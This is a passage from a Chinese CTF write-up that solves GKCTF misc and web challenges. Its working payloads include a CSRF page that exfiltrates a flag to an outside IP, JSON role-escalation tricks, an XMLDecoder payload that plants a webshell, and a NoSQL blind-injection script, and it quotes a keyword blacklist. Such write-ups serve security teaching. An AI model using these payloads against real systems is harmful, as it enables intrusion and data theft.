src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626267391309.3439ffc654a48054407c53728fa1a30c8ddf0707.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;</span><br></pre></td></tr></table></figure><h3 id="0-03"><a href="#0-03" class="headerlink" title="0.03"></a>0.03</h3><p>使用 WinRAR 解压附件后使用 NTFS Streams 分离文件流。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626271869168.afa1a4238139e761be1bd04c24db2e6e38186626.png"></p><p>可以得到如下内容，配合解压得到的 secret.txt 可以解三分密码。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QAZ WSX EDC</span><br><span class="line">RFV TGB YHN</span><br><span class="line">UJM IKO LP&#x2F;</span><br><span class="line">311223313313112122312312313311</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626273942571.9ceaad526a54bcb6dbb79b32716051260df7379f.png"></p><p>解出三分密码后可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EBCCAFDDCE</span><br></pre></td></tr></table></figure><p>使用上述信息作为密码挂载 Vera Crypt 隐藏磁盘可得 flag 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85ec0e23-ebbe-4fa7-9c8c-e8b743d0d85c&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><blockquote><p>后台密码5位弱口令</p></blockquote><p>根据 hint 可使用 <code>admin/12345</code> 作为账号密码登录 <code>/admin.php</code> 的管理后台。后台的自定义主题处存在一个任意文件下载，因此可以直接构造出如下链接下载到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b3a42f69-75d9-4871-a822-4f748b7879fe.node4.buuoj.cn&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L2ZsYWc&#x3D;</span><br></pre></td></tr></table></figure><p><code>L2ZsYWc=</code> 即 <code>/flag</code> Base64 Encode 一次的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;56d0914c-08c5-4af6-92b2-e31d2f947d5d&#125;</span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>根据后台版本号下载一份 V7.7 的 CMS 源码。找到 <code>chanzhieps/system/module/ui/control.php</code> 这个文件下的 <code>downloadtheme</code> 方法。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626503466852/7c4c2c528234e46e9e22884bdcd7e4ee3d070e6e.png"></p><p>可以很直接地看到这里直接采用 <code>file_get_contents</code> 将文件读入后推给了下载流而没做任何校验，因此达成了任意文件下载。</p><h3 id="CheckBot"><a href="#CheckBot" class="headerlink" title="CheckBot"></a>CheckBot</h3><blockquote><p>让bot访问/admin.php才有flag，但是怎么带出来呢</p></blockquote><p>主页面可以找到如下提示，结合题目的 hint 可以实现一个 CSRF 来访问 admin.php。纯粹使用 XMLHttpRequest 会造成一次跨域请求从而无法成功。因此采用一个 iframe 来代替。构造如下页面，放到自己的服务器上，然后将链接提交给 Bot。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">/* Prepare flag */</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).contentWindow.document.getElementById(<span class="string">&quot;flag&quot;</span>).innerHTML;</span></span><br><span class="line"><span class="javascript">                <span class="comment">/* Export flag */</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> exportFlag = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                exportFlag.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://8.136.8.210:3255/flagis-&#x27;</span> + <span class="built_in">window</span>.btoa(flag));</span></span><br><span class="line">                exportFlag.send();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在服务端的对应端口开启监听，即可监听到包含 Base64 编码后的 flag 的请求。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626585233142/04040d9328142655595470c491d086dbf5140e7f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b441a430-7064-4012-b862-dd8b7d71db91&#125;</span><br></pre></td></tr></table></figure><h3 id="babycat"><a href="#babycat" class="headerlink" title="babycat"></a>babycat</h3><h4 id="管理员账户获取"><a href="#管理员账户获取" class="headerlink" title="管理员账户获取"></a>管理员账户获取</h4><p>登录一次发现传送的是 JSON，同时 <code>/register</code> 路由下可以发现如下 JS 代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var obj=&#123;&#125;;</span></span><br><span class="line"><span class="comment">// obj[&quot;username&quot;]=&#x27;test&#x27;;</span></span><br><span class="line"><span class="comment">// obj[&quot;password&quot;]=&#x27;test&#x27;;</span></span><br><span class="line"><span class="comment">// obj[&quot;role&quot;]=&#x27;guest&#x27;;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doRegister</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.username==<span class="literal">null</span> || obj.password==<span class="literal">null</span>)&#123;</span><br><span class="line">        alert(<span class="string">&quot;用户名或密码不能为空&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">        d.username=obj.username;</span><br><span class="line">        d.password=obj.password;</span><br><span class="line">        d.role=<span class="string">&quot;guest&quot;</span>;</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&quot;/register&quot;</span>,</span><br><span class="line">            type:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">            contentType: <span class="string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>,</span><br><span class="line">            data: <span class="string">&quot;data=&quot;</span>+<span class="built_in">JSON</span>.stringify(d),</span><br><span class="line">            dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以得知注册的表单结构，发送 json 载荷注册一个用户。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626756458625424/cb0a424ad6fb71fb341579799848e07861ca90ec.png"></p><p>登录之后在下载测试处可以发现一个目录穿越，构造 <code>file=../../WEB-INF/web.xml</code> 尝试读取出 web.xml。因为上传业务只有管理员可以使用它，因此根据其中的内容构造 <code>../../WEB-INF/classes/com/web/servlet/registerServlet.class</code> 先看注册的源码。使用 jadx 反编译 class 文件可以看到其源码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626756906616529/db5a43545addacb431d210985fa39d4f54bcf75e.png@.jpg"></p><p>可以很容易找到如下针对参数 <code>role</code> 的处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">var</span> = req.getParameter(<span class="string">&quot;data&quot;</span>).replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">Matcher matcher = Pattern.compile(<span class="string">&quot;\&quot;role\&quot;:\&quot;(.*?)\&quot;&quot;</span>).matcher(<span class="keyword">var</span>);</span><br><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">    role = matcher.group();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!StringUtils.isNullOrEmpty(role)) &#123;</span><br><span class="line">    person = (Person) gson.fromJson(<span class="keyword">var</span>.replace(role, <span class="string">&quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;</span>), Person.class);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    person = (Person) gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">    person.setRole(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时有两种方法去绕过，因为正则表达式包括了 <code>\&quot;role\&quot;:\&quot;(.*?)\&quot;</code> 进行完整匹配，而 JSON 中的内联注释不会影响其解析，因此可以使用注释来破坏正则匹配。为了让其不直接走到 <code>setRole</code>，我们仍然需要让正则匹配有结果。JSON 中键值一样的数据解析时后面的会覆盖前面的，因此可以构造如下载荷。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;LemonPrefect&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;superUserLemonPrefect&quot;</span>,<span class="attr">&quot;role&quot;</span><span class="comment">/**/</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>可以注意到这里取得的正则匹配结果是最后一个，在可以使用注释的情况下，可以构造如下载荷。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;LemonPrefect&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="comment">/*,&quot;role&quot;:&quot;guest&quot;*/</span>&#125;</span><br></pre></td></tr></table></figure><p>发送上述载荷即可得到管理员账户，登录之后可以访问上传业务。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626757517345095/3a190e8ecff9137a3abb6f53ad4553fa65bf0579.png"></p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>此时再来读上传的源码，构造出载荷 <code>file=../../WEB-INF/classes/com/web/servlet/uploadServlet.class</code> 来读取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">    req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">&#125;</span><br><span class="line">item.write(<span class="keyword">new</span> File(uploadPath + File.separator + name + ext));</span><br><span class="line">req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以发现检测拓展名白名单后没有退出，响应后仍然会保存文件，因此可以尝试向 <code>../../static/</code> 下写入一句话。使用冰蝎连接即可执行 <code>/readflag</code> 从而获取到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626759548380742/f59749af93c79c1514d0d17c347964cbf6f1a70d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;beed2f77-3c76-492a-86b7-a00741f7cddc&#125;</span><br></pre></td></tr></table></figure><h3 id="babycat-revenge"><a href="#babycat-revenge" class="headerlink" title="babycat-revenge"></a>babycat-revenge</h3><blockquote><p>1.你知道注释符吗 2.PrintWriter？</p></blockquote><p>原本的上传逻辑已经修复如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">    req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    item.write(<span class="keyword">new</span> File(uploadPath + File.separator + name + ext));</span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时再看上传文件白名单，允许上传的文件中有 xml 文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkExt</span><span class="params">(String ext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!Arrays.asList(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;bak&quot;</span>, <span class="string">&quot;properties&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;xhtml&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;gz&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;txt&quot;</span>).contains(ext.toLowerCase())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现注册业务中导入了 <code>com.web.dao.baseDao</code>，在其源码中用到了方法 <code>XMLDecoder</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getConfig</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    HashMap map;</span><br><span class="line">    Object obj = <span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> FileInputStream(System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;</span>)).readObject();</span><br><span class="line">    <span class="keyword">if</span> ((obj <span class="keyword">instanceof</span> HashMap) &amp;&amp; (map = (HashMap) obj) != <span class="keyword">null</span> &amp;&amp; map.get(<span class="string">&quot;url&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        driver = (String) map.get(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        url = (String) map.get(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        username = (String) map.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        password = (String) map.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>System.getenv(&quot;CATALINA_HOME&quot;)</code> 可以使用前面的文件包含读取 <code>/proc/self/environ</code> 得到为 <code>/usr/local/tomcat</code>。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。上传业务中还对上传的内容执行了检测。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkContent</span><span class="params">(InputStream item)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] blackList;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(item));</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            String line = bf.readLine();</span><br><span class="line">            <span class="keyword">if</span> (line == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(line);</span><br><span class="line">        &#125;</span><br><span class="line">        String content = sb.toString();</span><br><span class="line">        <span class="keyword">for</span> (String str : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;ProcessBuilder&quot;</span>, <span class="string">&quot;jdbc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>&#125;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (content.contains(str)) &#123;</span><br><span class="line">                flag = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时考虑使用 hint 中提到的 <code>PrintWriter</code> 去写入冰蝎的一句话，构造出如下载荷上传。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/tomcat/webapps/ROOT/static/shell.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[冰蝎的载荷]]&gt;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626763390869337/6a1127a1479f3693b81dab6f6c0bd5ce7d85d9f6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2dea8c2c-fd37-4f34-81a8-a1ee48f49039&#125;</span><br></pre></td></tr></table></figure><h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><h4 id="SQL-注入读取文件"><a href="#SQL-注入读取文件" class="headerlink" title="SQL 注入读取文件"></a>SQL 注入读取文件</h4><p>在页面源码中可以找到如下提示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--doyounosql?--&gt;</span></span><br></pre></td></tr></table></figure><p>因此使用脚本进行 NoSQL 盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits  <span class="comment"># [A-Za-z0-9]</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&#123;&quot;username&quot;:&#123;&quot;$\\u0065\\u0071&quot;: &quot;admin&quot;&#125;, &quot;password&quot;: &#123;&quot;$\\u0072\\u0065\\u0067\\u0065\\u0078&quot;: &quot;^%s&quot;&#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://node4.buuoj.cn:25717/login.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> characters:</span><br><span class="line">        response = requests.post(url=url, data=(payload % (password + character)),</span><br><span class="line">                                 headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>&#125;)</span><br><span class="line">        responseContent = response.content.decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Trying <span class="subst">&#123;character&#125;</span> with response <span class="subst">&#123;responseContent&#125;</span>&quot;</span>)</span><br><span class="line">        response.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登录了&quot;</span> <span class="keyword">in</span> responseContent:</span><br><span class="line">            password += character</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Found new character <span class="subst">&#123;character&#125;</span> with password now which is <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以得出用户 <code>admin</code> 的密码为 <code>42276606202db06ad1f29ab6b4a1307f</code>。登录之后可以传入文件路径读取文件，尝试读取出 <code>/flag</code> 可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(5) &quot;&#x2F;flag&quot; flag is in the Intranet</span><br></pre></td></tr></table></figure><p>读取 <code>/proc/self/environ</code>，可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(18) &quot;&#x2F;proc&#x2F;self&#x2F;environ&quot; USER&#x3D;nginxPWD&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlSHLVL&#x3D;1HOME&#x3D;&#x2F;home&#x2F;nginx_&#x3D;&#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>读取 nginx 的配置文件可以得到如下内容。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">error_page</span> <span class="number">404</span> <span class="number">404</span>.php;</span><br><span class="line">        <span class="attribute">root</span> /usr/local/nginx/html;</span><br><span class="line">        <span class="attribute">index</span> index.htm index.html index.php;</span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">           <span class="attribute">root</span>           /usr/local/nginx/html;</span><br><span class="line">           <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">           <span class="attribute">fastcgi_index</span>  